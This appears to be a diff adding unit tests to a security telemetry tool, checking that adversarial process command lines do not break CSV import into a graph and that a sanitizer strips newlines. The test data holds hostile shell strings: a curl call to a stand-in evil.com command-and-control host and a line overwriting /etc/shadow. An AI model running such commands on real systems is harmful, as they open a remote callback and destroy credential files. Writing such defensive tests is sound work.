@@ -235,6 +235,62 @@ class TestTransientGraph:
             assert row[2] == 1
 
 
+    def test_adversarial_cmdline_commas_and_newlines(self, tmp_path):
+        """Cmd_line with commas, newlines, and quotes must not break CSV import."""
+        # Simulate adversary-crafted process names that break naive CSV parsing
+        adversarial_cmd = (
+            'bash -c "curl http://evil.com/c2,callback\n'
+            'echo pwned > /etc/shadow"\r\n'
+            '--flag="injected,column"'
+        )
+        ocsf = ProcessActivity(
+            activity_id=1,
+            time=_now(),
+            process=ProcessInfo(
+                pid=6666, name="bash", cmd_line=adversarial_cmd, parent_pid=1,
+            ),
+            device=DeviceInfo(hostname="test-host"),
+        )
+        entities = ExtractedEntities()
+        now = _now()
+        entities.processes.append(ProcessNode(
+            id="test-host:6666:0", name="bash", pid=6666,
+            cmd_line=adversarial_cmd, hostname="test-host",
+            start_time=now, parent_pid=1,
+        ))
+        entities.users.append(UserNode(
+            id="attacker", name="attacker", first_seen=now, last_seen=now,
+        ))
+        reader = _populate_ledger(tmp_path, [(ocsf, entities)])
+
+        t = time.time()
+        with TransientGraph(reader, t - 60, t + 60, buffer_pool_mb=128) as conn:
+            result = conn.execute(
+                "MATCH (p:Process) WHERE p.pid = 6666 "
+                "RETURN p.name, p.cmd_line, p.hostname"
+            )
+            row = result.get_next()
+            assert row[0] == "bash"
+            # Newlines stripped by _san(), commas preserved inside quoted field
+            assert "curl http://evil.com/c2,callback" in row[1]
+            assert "\n" not in row[1]
+            assert "\r" not in row[1]
+            assert row[2] == "test-host"
+
+    def test_sanitize_function(self):
+        """_san strips newlines and NUL bytes."""
+        from agent.ledger.reader import _san
+
+        assert _san("normal") == "normal"
+        assert _san("line1\nline2") == "line1 line2"
+        assert _san("line1\r\nline2") == "line1 line2"
+        assert _san("has\x00null") == "hasnull"
+        assert _san(None) == ""
+        assert _san(12345) == "12345"
+        # Commas and quotes preserved (handled by CSV quoting)
+        assert _san('say "hello", world') == 'say "hello", world'
+
+
 # ── WarmGraph Tests ──
 
 
